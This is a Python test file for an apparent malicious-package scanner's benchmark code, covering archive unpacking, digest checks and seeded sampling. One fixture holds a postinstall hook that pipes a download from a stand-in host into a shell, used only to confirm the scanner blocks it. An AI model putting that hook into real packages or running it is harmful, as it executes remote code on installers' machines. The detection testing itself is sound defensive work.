"""bench/independent.py, offline: how a sample is unpacked in memory, how downloads are checked, and that the draw is
fixed by its seed. The evaluation itself needs the network and runs by hand (see its docstring)."""
from __future__ import annotations

import base64
import hashlib
import io
import os
import sys
import tarfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "bench"))

import independent  # noqa: E402


def _zip(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def _tgz(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            t.addfile(info, io.BytesIO(data))
    return buf.getvalue()


class UnpackTests(unittest.TestCase):
    def test_npm_sample_lands_at_the_root_without_registry_metadata(self):
        wrapper = _zip({"tmp/tmpabc/pkg/package/package.json": b'{"name":"pkg"}',
                        "tmp/tmpabc/pkg/package/index.js": b"x",
                        "tmp/tmpabc/pkg/package_info-pkg-1.0.0.json": b"{}"})
        files, notes = independent.package_files({"git_blob": "0"}, wrapper)
        self.assertEqual(sorted(files), ["index.js", "package.json"])
        self.assertIn("registry metadata file left out", notes)

    def test_a_wrapped_package_archive_is_opened(self):
        sdist = _tgz({"evil-1.0/setup.py": b"print(1)", "evil-1.0/evil/__init__.py": b""})
        files, notes = independent.package_files({"git_blob": "0"}, _zip({"2024-01-01-evil-v1.0/evil-1.0.tar.gz": sdist}))
        self.assertEqual(sorted(files), ["evil/__init__.py", "setup.py"])
        self.assertIn("package archive opened", notes)

    def test_a_benign_release_is_unpacked_the_same_way(self):
        files, _ = independent.package_files({"sha256": "0"}, _tgz({"package/package.json": b"{}",
                                                                   "package/lib/a.js": b""}))
        self.assertEqual(sorted(files), ["lib/a.js", "package.json"])

    def test_paths_outside_the_archive_are_left_out(self):
        files, notes = independent.package_files({"sha256": "0"}, _zip({"p/a.py": b"", "../escape.py": b""}))
        self.assertEqual(sorted(files), ["a.py"])
        self.assertTrue(any("outside the archive" in n for n in notes))

    def test_not_an_archive(self):
        with self.assertRaises(ValueError):
            independent.package_files({"sha256": "0"}, b"plain text")


class DigestTests(unittest.TestCase):
    def test_each_kind_of_pinned_digest(self):
        data = b"payload"
        blob = hashlib.sha1(b"blob 7\0" + data).hexdigest()
        self.assertTrue(independent._digest_ok({"git_blob": blob}, data))
        self.assertFalse(independent._digest_ok({"git_blob": blob}, data + b"!"))
        self.assertTrue(independent._digest_ok({"sha256": hashlib.sha256(data).hexdigest()}, data))
        sri = "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
        self.assertTrue(independent._digest_ok({"integrity": sri}, data))
        self.assertTrue(independent._digest_ok({"shasum": hashlib.sha1(data).hexdigest()}, data))
        self.assertFalse(independent._digest_ok({}, data))


class PathTests(unittest.TestCase):
    def test_recorded_paths_use_forward_slashes_from_the_root(self):
        target = independent.ROOT / "bench" / "fixtures" / "independent-sample-round2.json"
        self.assertEqual(independent._rel(target), "bench/fixtures/independent-sample-round2.json")
        relative = Path(os.path.relpath(target))  # as typed on the command line, from any folder
        self.assertEqual(independent._rel(relative), "bench/fixtures/independent-sample-round2.json")


class DrawTests(unittest.TestCase):
    def test_the_draw_is_fixed_by_the_seed(self):
        frame = {s: {f"p{i}": [{"path": f"samples/{s}/p{i}/{v}/x.zip", "bytes": 1, "git_blob": "0"} for v in (1, 2)]
                     for i in range(1, 700)} for s in independent.MALICIOUS}
        (first, _), (second, _) = independent.draw_malicious(frame), independent.draw_malicious(frame)
        self.assertEqual(first, second)
        per_set = {s: sum(r["set"] == s for r in first) for s in independent.MALICIOUS}
        for s, k in independent.MALICIOUS.items():
            self.assertEqual(per_set[s], k if k is not None else 699)
        self.assertEqual(first[0]["version"], first[0]["path"].split("/")[4])

    def test_a_second_round_draws_new_packages_and_halves_the_whole_sets(self):
        frame = {s: {f"p{i}": [{"path": f"samples/{s}/p{i}/1/x.zip", "bytes": 1, "git_blob": "0"}]
                     for i in range(1, 700)} for s in independent.MALICIOUS}
        first, _ = independent.draw_malicious(frame)
        used: dict[str, set[str]] = {}
        for row in first:
            used.setdefault(row["set"], set()).add(row["package"])
        second, tune = independent.draw_malicious(frame, "round 2", used, split=True, commit="abc")
        for row in second:
            if independent.MALICIOUS[row["set"]] is not None:
                self.assertNotIn(row["package"], used[row["set"]])  # never drawn before
            else:
                self.assertNotIn(row["package"], tune[row["set"]])  # measured only on the half not tuned on
            self.assertEqual(row["commit"], "abc")
        for stratum, names in tune.items():
            tested = {r["package"] for r in second if r["set"] == stratum}
            self.assertEqual(len(names) + len(tested), 699)
            self.assertFalse(set(names) & tested)

    def test_a_third_round_takes_only_packages_no_earlier_round_used(self):
        frame = {s: {f"p{i}": [{"path": f"samples/{s}/p{i}/1/x.zip", "bytes": 1, "git_blob": "0"}]
                     for i in range(1, 700)} for s in independent.MALICIOUS}
        used: dict[str, set[str]] = {}
        first, _ = independent.draw_malicious(frame)
        second, tune = independent.draw_malicious(frame, "round 2", _names(first), split=True)
        for row in [*first, *second]:
            used.setdefault(row["set"], set()).add(row["package"])
        for stratum, names in tune.items():
            used[stratum].update(names)
        added = {s: {**packages, **{f"new{i}": [{"path": f"samples/{s}/new{i}/1/x.zip", "bytes": 1, "git_blob": "0"}]
                                    for i in (1, 2)}} for s, packages in frame.items()}  # published since
        third, kept_back = independent.draw_malicious(added, "round 3", used, commit="def")
        self.assertEqual(kept_back, {})
        for row in third:
            self.assertNotIn(row["package"], used[row["set"]])
        for stratum, k in independent.MALICIOUS.items():
            drawn = sorted(r["package"] for r in third if r["set"] == stratum)
            if k is None:  # both halves were used: only what the dataset added since is left
                self.assertEqual(drawn, ["new1", "new2"])
            else:
                self.assertEqual(len(drawn), min(k, 699 + 2 - len(used[stratum])))


def _names(rows: list[dict]) -> dict[str, set[str]]:
    out: dict[str, set[str]] = {}
    for row in rows:
        out.setdefault(row["set"], set()).add(row["package"])
    return out


class BaselineTests(unittest.TestCase):
    def test_an_earlier_commit_judges_beside_the_current_code(self):
        import shutil
        import subprocess
        import tempfile

        if subprocess.run(["git", "-C", str(ROOT), "rev-parse", "HEAD"], capture_output=True).returncode:
            self.skipTest("not a git checkout")
        tmp = tempfile.mkdtemp(prefix="pah-baseline-test-")
        self.addCleanup(shutil.rmtree, tmp, True)
        self.addCleanup(setattr, independent, "BASELINE_SCAN", None)
        sha = independent.baseline_package("HEAD", Path(tmp))
        self.assertRegex(sha, r"^[0-9a-f]{40}$")
        self.assertTrue((Path(tmp) / "pah_baseline" / "scan.py").is_file())
        self.assertTrue((Path(tmp) / "pah_baseline" / "data" / "popular-npm.txt").is_file())
        independent._use_baseline(tmp)
        import pah_baseline.scan  # noqa: F401  (a package of its own, not the current pah)
        self.assertNotEqual(Path(sys.modules["pah_baseline.scan"].__file__).parent, ROOT / "pah")
        beacon = {"package.json": b'{"name": "d", "version": "1.0.0", "scripts": {"postinstall": '
                                  b'"curl -s https://drop.example.invalid/x | sh"}}'}
        out = independent.judge(beacon)
        self.assertEqual(out["verdict_baseline"], "block")
        self.assertEqual(out["verdict"], "block")
        self.assertIn("PAH-P001", out["rules_baseline"])


if __name__ == "__main__":
    unittest.main()
